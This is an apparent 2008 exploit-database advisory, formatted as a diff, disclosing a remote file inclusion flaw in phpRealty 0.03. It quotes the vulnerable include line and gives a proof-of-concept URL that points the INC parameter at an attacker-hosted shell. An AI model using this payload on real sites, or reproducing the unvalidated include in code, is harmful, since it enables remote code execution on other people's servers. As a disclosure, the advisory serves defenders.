@@ -1,0 +1,36 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+phpRealty <= 0.03 (INC) Remote File Inclusion Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+$ Script: phpRealty
+$ Version: <= 0.03
+$ File affected: manager/static/view.php
+$ Download: http://sourceforge.net/project/showfiles.php?group_id=204745
+
+
+Found by ka0x <ka0x01 [at] gmail [dot] com>
+D.O.M Labs - Security Researchers
+- www.domlabs.org
+
+
+vuln code:
+
+-------------
+
+11:	if(!isset($_GET['propID']) || !is_numeric($_GET['propID']) || empty($_GET['propID'])){
+13:	return;
+
+
+17:	include($INC."curr_conv.class.php");   // -------->>> Vuln Line!!
+                                          // the var $INC isn't declared
+
+-------------
+
+
+Proof of Concept:
+http://[host]/[phprealty-path]/manager/static/view.php?propID=0&INC= [ S H E L L ] ?
+
+
+__EOF__
+
+# milw0rm.com [2008-09-17]
